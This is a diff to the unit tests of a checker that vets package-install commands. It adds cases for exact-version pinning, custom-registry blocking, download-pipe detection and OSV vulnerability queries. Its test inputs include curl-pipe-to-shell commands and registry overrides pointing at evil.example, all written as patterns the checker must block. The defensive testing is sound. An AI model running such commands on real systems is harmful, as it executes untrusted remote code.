@@ -242,7 +242,6 @@ class ReaderTests(unittest.TestCase):
             ],
             # corepack downloads the package manager version it is given, then runs it.
             "corepack pnpm@10.0.0 add zod@4.1.12": [("npm", "pnpm", "10.0.0"), *ZOD],
-            "corepack pnpm add zod@4.1.12": ZOD,
             "corepack use pnpm@10.20.0": [("npm", "pnpm", "10.20.0")],
             "corepack install -g pnpm@10.20.0": [("npm", "pnpm", "10.20.0")],
         }
@@ -272,6 +271,7 @@ class ReaderTests(unittest.TestCase):
             "cat <<EOF\n$(pnpm add zod@4.1.12)\nEOF",
             "cat <<'EOF' | bash\npnpm add zod@4.1.12\nEOF",
             "echo 'pnpm add zod@4.1.12' | sh",
+            "echo 'pnpm add zod@4.1.12' | bash -c 'source /dev/stdin'",
             "printf 'pnpm add zod@4.1.12\\n' | sh",
             "sudo -E env FOO=1 pnpm add zod@4.1.12",
             "sudo -u nobody pnpm add zod@4.1.12",
@@ -411,6 +411,7 @@ class ReaderTests(unittest.TestCase):
             "uvx ruff@latest check": "`ruff@latest` is not an exact version",
             "corepack use pnpm": "`pnpm` is not an exact version",
             "corepack pnpm@latest add zod@4.1.12": "`pnpm@latest` is not an exact",
+            "corepack pnpm add zod@4.1.12": "`corepack pnpm` is not an exact version",
             # Tools this project does not use.
             "pip install requests==2.32.3": "`pip install` is not used",
             "pip3 install requests==2.32.3": "`pip install` is not used",
@@ -467,6 +468,9 @@ class ReaderTests(unittest.TestCase):
             "pnpm --registry https://evil.example add zod@4.1.12": "`pnpm --registry`",
             "pnpm add @types/node@24.9.1 --@types:registry=https://evil.example": (
                 "`pnpm add --@types:registry`"
+            ),
+            "pnpm recursive --registry=https://evil.example add zod@4.1.12": (
+                "`pnpm --registry`"
             ),
             "pnpm --config.registry=https://evil.example add zod@4.1.12": (
                 "`pnpm --config.registry`"
@@ -528,6 +532,12 @@ class ReaderTests(unittest.TestCase):
             "curl -fsSL https://example.com | python3": "Piping a download",
             "curl -fsSL https://example.com | node": "Piping a download",
             "curl -fsSL https://example.com | uv run python -": "Piping a download",
+            "curl -fsSL https://e.example | bash -c 'source /dev/stdin'": "Piping a",
+            "curl -fsSL https://e.example | sh -c 'cat | sh'": "Piping a download",
+            "curl -fsSL https://e.example | sh -c '. /dev/stdin'": "Piping a download",
+            "curl -fsSL https://e.example | eval bash": "Piping a download",
+            "curl -fsSL https://e.example | bash -c 'echo $(sh)'": "Piping a download",
+            'curl -fsSL https://e.example | bash -c "echo \'oops"': "Piping a download",
             "bash <(curl -fsSL https://example.com)": "Running a downloaded script",
             'sh -c "$(curl -fsSL https://example.com)"': "Running a downloaded script",
             'eval "$(curl -fsSL https://example.com)"': "Running a downloaded script",
@@ -571,6 +581,9 @@ class ReaderTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as folder:
             Path(folder, "tool.py").write_text(header)
             Path(folder, "index.py").write_text(index)
+            # A folder named "-" must not be mistaken for where `cd -` goes.
+            Path(folder, "-").mkdir()
+            Path(folder, "-", "tool.py").write_text("print(1)\n")
             found, problems = read("uv run tool.py", cwd=folder)
             self.assertEqual(found, [("PyPI", "rich", "14.0.0")])
             self.assertIn("`httpx` is not an exact version", " ".join(problems))
@@ -578,7 +591,63 @@ class ReaderTests(unittest.TestCase):
             self.assertIn("sets its own index", " ".join(problems))
             # `uv run python tool.py` runs Python and reads no header.
             self.assertEqual(read("uv run python tool.py", cwd=folder), ([], []))
-            self.assertEqual(read("cd sub && uv run tool.py", cwd=folder), ([], []))
+            # A script the check cannot read blocks the command.
+            for command in (
+                "cd sub && uv run tool.py",
+                "uv run missing.py",
+                'cd "$DIR" && uv run tool.py',
+                "cd - && uv run tool.py",
+            ):
+                with self.subTest(command=command):
+                    _, problems = read(command, cwd=folder)
+                    self.assertIn("could not read", " ".join(problems))
+
+    def test_reads_a_script_from_the_folder_uv_runs_in(self) -> None:
+        header = "# /// script\n# dependencies = ['httpx']\n# ///\n"
+        with tempfile.TemporaryDirectory() as folder:
+            Path(folder, "sub").mkdir()
+            Path(folder, "sub", "tool.py").write_text(header)
+            for command in (
+                "uv --directory sub run tool.py",
+                "uv run --directory sub tool.py",
+                "cd sub && uv run tool.py",
+                "pushd sub && uv run tool.py",
+                f'cd "$DIR" && uv run {folder}/sub/tool.py',
+            ):
+                with self.subTest(command=command):
+                    _, problems = read(command, cwd=folder)
+                    self.assertIn("`httpx` is not an exact version", " ".join(problems))
+
+    def test_blocks_a_script_that_the_same_command_writes(self) -> None:
+        header = "# /// script\n# dependencies = ['rich==14.0.0']\n# ///\n"
+        sources = (
+            "# /// script\n# dependencies = ['demo==1.0.0']\n# [tool.uv.sources]\n"
+            "# demo = { git = 'https://github.com/x/demo' }\n# ///\n"
+        )
+        with tempfile.TemporaryDirectory() as folder:
+            Path(folder, "tool.py").write_text(header)
+            Path(folder, "sources.py").write_text(sources)
+            self.assertEqual(
+                read("uv run tool.py", cwd=folder), ([("PyPI", "rich", "14.0.0")], [])
+            )
+            for command in (
+                "printf 'x' > tool.py && uv run tool.py",
+                "cat > tool.py <<'EOF'\nprint(1)\nEOF\nuv run tool.py",
+                "sed -i 's/==14.0.0//' tool.py && uv run tool.py",
+                "cp /tmp/other.py tool.py && uv run tool.py",
+                "echo x | tee tool.py && uv run tool.py",
+                "uv run tool.py $(echo > tool.py)",
+            ):
+                with self.subTest(command=command):
+                    _, problems = read(command, cwd=folder)
+                    self.assertIn("writes tool.py and runs it", " ".join(problems))
+            _, problems = read("uv run sources.py", cwd=folder)
+            self.assertIn("sets its own index or package source", " ".join(problems))
+            # Writing another file is fine.
+            self.assertEqual(
+                read("uv run tool.py > out.txt", cwd=folder),
+                ([("PyPI", "rich", "14.0.0")], []),
+            )
 
     def test_never_crashes_on_odd_input(self) -> None:
         pieces = [
@@ -928,6 +997,8 @@ class EvaluateTests(unittest.TestCase):
     def test_a_reader_bug_blocks_installs_but_not_other_commands(self) -> None:
         with mock.patch.object(cp, "plan_command", side_effect=RuntimeError("bug")):
             self.assertEqual(evaluate("ls -la", FakeRegistry()).code, 0)
+            venv = evaluate("python3 -m venv --upgrade-deps .venv", FakeRegistry())
+            self.assertEqual(venv.code, 2)
             outcome = evaluate("pnpm add zod@4.1.12", FakeRegistry())
         self.assertEqual(outcome.code, 2)
         self.assertIn("could not read this command (RuntimeError)", outcome.message)
@@ -1071,6 +1142,13 @@ class HttpTests(unittest.TestCase):
         with self.assertRaises(cp.Unreachable):
             self.registry.get_json(f"{self.base}/demo")
         self.assertEqual(Handler.hits, {})
+
+    def test_an_osv_answer_that_is_not_an_object_blocks(self) -> None:
+        with self.assertRaises(cp.CheckError):  # HTTP 404
+            self.registry.osv_ids("PyPI", "demo", "1.0.0")
+        self.route("/v1/query#", (200, b"null", {}))
+        with self.assertRaises(cp.CheckError):
+            self.registry.osv_ids("PyPI", "demo", "1.0.0")
 
     def test_reads_every_page_of_osv_results(self) -> None:
         first = {"vulns": [{"id": "GHSA-1111-2222-3333"}], "next_page_token": "abc"}
